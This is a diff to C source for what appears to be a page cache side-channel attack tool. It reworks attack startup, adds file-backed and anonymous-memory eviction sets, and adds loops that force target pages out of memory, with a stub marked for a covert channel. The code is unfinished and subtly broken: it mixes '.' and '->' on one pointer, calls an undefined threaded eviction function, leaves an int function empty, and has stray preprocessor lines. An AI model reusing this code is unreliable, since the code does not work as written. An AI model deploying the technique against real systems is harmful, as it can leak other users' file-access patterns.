@@ -382,13 +382,14 @@ int pcaStart(Attack *attack, int flags)
             goto error;
         }
 
+
+        // TODO move to main
         printf(INFO "%zu files with %zu mapped bytes of sequences bigger than %zu pages are currently resident in memory.\n",
                attack.working_set_.resident_files_.count_, attack.working_set_.mem_in_ws_, attack.working_set_.ps_add_threshold_);
     }
 
-
     // create + map attack eviction set
-    DEBUG_PRINT((DEBUG "Trying to create a %zu MB random file.\nThis might take a while...\n", 
+    DEBUG_PRINT((DEBUG "Trying to create a %zu MB eviction set.\nThis might take a while...\n", 
         TOTAL_RAM_BYTES / 1024 / 1024));
     ret = createEvictionSet(attack);
     if (ret != 0)
@@ -397,46 +398,37 @@ int pcaStart(Attack *attack, int flags)
         goto error;
     }
 
-
-
-
-    printf(PENDING "Initialising...\n");
-
-
-// if wanted use eviction threads
-#ifdef ES_USE_THREADS
-    if (spawnESThreads(&attack.eviction_set_, attack.target_addr_, attack.mincore_check_all_x_bytes_) != 0)
+    // TODO fix their function later
+    // if wanted use eviction threads
+    if(attack->eviction_set_.use_access_threads_)
     {
-        printf(FAIL "Error at spawnESThreads...\n");
-        goto error;
-    }
-#endif
-
-    // next thread(s) by default on different core
-    CPU_ZERO(&cpu_mask);
-    CPU_SET(used_pus, &cpu_mask);
-    pthread_attr_setaffinity_np(&thread_attr, sizeof(cpu_set_t), &cpu_mask);
-    used_pus = (used_pus + PU_INCREASE < MAX_PUS) ? used_pus + PU_INCREASE : used_pus;
-
-    // spawn surpressing set worker threads
-    if (spawnSuppressThreads(&attack, &thread_attr) != 0)
-    {
-        printf(FAIL "Error at spawnSSThreads...\n");
-        goto error;
-    }
-
-    // manager for working set
-    if (attack.use_attack_ws_ && pthread_create(&attack.ws_manager_thread_, &thread_attr, wsManagerThread, &attack.working_set_) != 0)
-    {
-        printf(FAIL "Error " OSAL_EC_FS " at pthread_create...\n", OSAL_EC);
-    }
-
-    // manager for blocking set
-    if (attack.use_attack_bs_)
-    {
-        if (pthread_create(&attack.bs_manager_thread_, &thread_attr, bsManagerThread, &attack.blocking_set_) != 0)
+        if (spawnESThreads(attack) != 0)
         {
-            printf(FAIL "Error " OSAL_EC_FS " at pthread_create...\n", OSAL_EC);
+            DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at spawnESThreads...\n", OSAL_EC));
+            goto error;
+        }
+    }
+
+    // TODO fix later
+    // spawn surpressing set worker threads
+    if (spawnSuppressThreads(attack) != 0)
+    {
+        DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at spawnSuppressThreads...\n", OSAL_EC));
+        goto error;
+    }
+
+    // start manager for working set
+    if (attack->use_attack_ws_ && pthread_create(&attack.ws_manager_thread_, &thread_attr, wsManagerThread, &attack.working_set_) != 0)
+    {
+        DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at pthread_create...\n", OSAL_EC));
+    }
+    
+    // start manager for blocking set
+    if (attack->use_attack_bs_)
+    {
+        if (pthread_create(&attack->bs_manager_thread_, &thread_attr, bsManagerThread, &attack.blocking_set_) != 0)
+        {
+            DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at pthread_create...\n", OSAL_EC));
         }
         else
         {
@@ -444,6 +436,25 @@ int pcaStart(Attack *attack, int flags)
             sem_wait(&attack.blocking_set_.initialized_sem_);
         }
     }
+
+
+
+
+
+
+
+
+
+    // TODO not really sure that brings any benefit
+    // next thread(s) by default on different core
+    CPU_ZERO(&cpu_mask);
+    CPU_SET(used_pus, &cpu_mask);
+    pthread_attr_setaffinity_np(&thread_attr, sizeof(cpu_set_t), &cpu_mask);
+    used_pus = (used_pus + PU_INCREASE < MAX_PUS) ? used_pus + PU_INCREASE : used_pus;
+
+
+
+
 
 
 
@@ -467,9 +478,10 @@ error:
 
 
 // teardown
-int pcaStop(Attack *attack)
+void pcaExit(Attack *attack)
 {
-    return 0;
+    // TODO stop running threads
+    exitAttack(attack);
 }
 
 
@@ -642,35 +654,184 @@ int pcaTargetFilesSampleFlushOnce(Attack *attack)
 
 
 // for covert channel
-int pcaTargetFileSampleFlushRangeOnce(Attack *attack, TargetFile *target_file, size_t offset, size_t range)
+int pcaTargetFileSampleFlushRangeOnce(Attack *attack, TargetFile *target_file)
 {
 
 }
-
 
 int createEvictionSet(Attack *attack)
 {
     int ret = 0;
 
-    // file eviction set
-    ret = createRandomFile(attack->eviction_set_.eviction_file_path_, TOTAL_RAM_BYTES);
-    if (ret != 0)
+    if(!attack->eviction_set_.use_anon_memory_)
     {
-        DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at createRandomFile...\n", OSAL_EC));
-        goto error;
+        // file eviction set
+        ret = createRandomFile(attack->eviction_set_.eviction_file_path_, TOTAL_RAM_BYTES);
+        if (ret != 0)
+        {
+            DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at createRandomFile...\n", OSAL_EC));
+            goto error;
+        }
+        if (mapFile(&attack->eviction_set_.mapping_, attack->eviction_set_.eviction_file_path_, 
+            FILE_ACCESS_READ | FILE_NOATIME, MAPPING_SHARED | MAPPING_ACCESS_READ) != 0)
+        {
+            DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at mapFile for: %s ...\n", OSAL_EC, 
+                attack->eviction_set_.eviction_file_path_));
+            goto error;
+        }
     }
-    if (mapFile(&attack->eviction_set_.mapping_, attack->eviction_set_.eviction_file_path_, 
-        FILE_ACCESS_READ | FILE_NOATIME, MAPPING_SHARED | MAPPING_ACCESS_READ) != 0)
+    else 
     {
-        DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at mapFile for: %s ...\n", OSAL_EC, 
-            attack->eviction_set_.eviction_file_path_));
-        goto error;
+        // anonymous eviction set
+        if (mapAnon(&attack->eviction_set_.mapping_, TOTAL_RAM_BYTES, MAPPING_PRIVATE 
+            | MAPPING_ACCESS_READ | MAPPING_ACCESS_WRITE | MAPPING_NORESERVE) != 0)
+        {
+            DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at mapFile for: %s ...\n", OSAL_EC, 
+                attack->eviction_set_.eviction_file_path_));
+            goto error;
+        }
     }
-    // anonymous eviction set
 
+    return 0;
 error:
+    closeFileMapping(&attack->eviction_set_.mapping_);
     return -1;
 }
+
+size_t evictTargets(Attack *attack, IsTargetEvictedFn target_evicted_fn, void *target_evicted_arg_ptr) 
+{
+    if(!attack->eviction_set_.use_access_threads_)
+    {
+        return evictTargets_(attack, target_evicted_fn, target_evicted_arg_ptr);
+
+    }
+    else
+    {
+        return evictTargetsThreads_(attack, target_evicted_fn, target_evicted_arg_ptr);
+    }
+}
+
+size_t evictTargets_(Attack *attack, IsTargetEvictedFn target_evicted_fn, void *target_evicted_arg_ptr)
+{
+    volatile uint8_t tmp = 0;
+    (void)tmp;
+    ssize_t accessed_mem = 0;
+
+    // TODO fix
+    // flag eviction running
+    __atomic_store_n(&eviction_running, 1, __ATOMIC_RELAXED);
+
+    for (size_t p = 0; p < attack->eviction_set_.mapping_.size_pages_; p++)
+    {
+        // check if evicted
+        if (accessed_mem % attack->eviction_set_.targets_check_all_x_bytes_ == 0 &&
+            target_evicted_fn(target_evicted_arg_ptr))
+        {
+          break;
+        }
+
+        // access ws
+        if (accessed_mem % attack->eviction_set_.ws_access_all_x_bytes_ == 0)
+        {
+            // TODO access working set
+        }
+
+        // prefetch larger blocks (more efficient IO)
+        if (accessed_mem % attack->eviction_set_.prefetch_es_bytes_ == 0)
+        {
+            if(adviseFileUsage(&attack->eviction_set_.mapping_, accessed_mem, 
+                attack->eviction_set_.prefetch_es_bytes_, USAGE_WILLNEED) != 0)
+            {
+                DEBUG_PRINT((DEBUG "Warning error " OSAL_EC_FS " at adviseFileUsage...\n", OSAL_EC));
+            }
+        }
+
+        // access page
+        if(!attack->eviction_set_.use_file_api_) 
+        {
+#ifdef __linux
+            if (pread(attack->eviction_set_.mapping_.internal_.fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1 ||
+                pread(attack->eviction_set_.mapping_.internal_.fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1 )
+            {
+                // in case of error just print warnings and access whole ES
+                DEBUG_PRINT((DEBUG "Warning error " OSAL_EC_FS " at pread...\n", OSAL_EC));
+            }
+#elif defined(_WIN32)
+
+#endif
+        }
+        else 
+        {
+            tmp = *((uint8_t *)attack->eviction_set_.mapping_.addr_ + p * PAGE_SIZE);
+        }
+
+        accessed_mem += PAGE_SIZE;
+    }
+
+    // remove eviction set to release pressure
+    if(adviseFileUsage(&attack->eviction_set_.mapping_, 0, 
+                attack->eviction_set_.mapping_.size_, USAGE_DONTNEED) != 0)
+    {
+        DEBUG_PRINT((DEBUG "Warning error " OSAL_EC_FS " at adviseFileUsage...\n", OSAL_EC));
+    }
+
+    // flag eviction done
+    __atomic_store_n(&eviction_running, 0, __ATOMIC_RELAXED);
+
+#ifdef _DETAILED_EVICTION_SET_STAT_
+    printf(INFO "[Eviction Set] Resident pages: %zu kB, access time: %zu us\n", already_resident * PAGE_SIZE / 1024, t_resident / 1000);
+    printf(INFO "[Eviction Set] Non resident pages: %zu kB, access time: %zu us\n", (accessed_mem - already_resident * PAGE_SIZE) / 1024, t_non_resident / 1000);
+#endif
+
+    return accessed_mem;
+}
+
+
+size_t evictTargetPage(Attack *attack)
+{
+    size_t accessed_mem_sum = 0;
+
+    // flag eviction running
+    __atomic_store_n(&eviction_running, 1, __ATOMIC_RELAXED);
+
+    // resume worker threads
+    for (size_t t = 0; t < attack->eviction_set_.access_thread_count_; t++)
+    {
+        // in case of error skip
+        if (sem_post(&attack->eviction_set_.worker_start_sem_) != 0)
+        {
+            printf(WARNING "Error (%s) at sem_post...\n", strerror(errno));
+            continue;
+        }
+    }
+
+    // wait for completion of the worker threads
+    for (size_t t = 0; t < attack->eviction_set_.access_thread_count_; t++)
+    {
+        // in case of error skip
+        if (sem_wait(&attack->eviction_set_.worker_join_sem_) != 0)
+        {
+            printf(WARNING "Error (%s) at sem_wait...\n", strerror(errno));
+            continue;
+        }
+
+        PageAccessThreadESData *thread_data = dynArrayGet(&attack->eviction_set_.access_threads_, t);
+        accessed_mem_sum += thread_data->accessed_mem_;
+    }
+
+    // flag eviction done
+    __atomic_store_n(&eviction_running, 0, __ATOMIC_RELAXED);
+
+    return accessed_mem_sum;
+}
+
+#else
+
+
+#endif
+
+
+
 
 
 int profileResidentPagesFile(Attack *attack, char *file_path) 
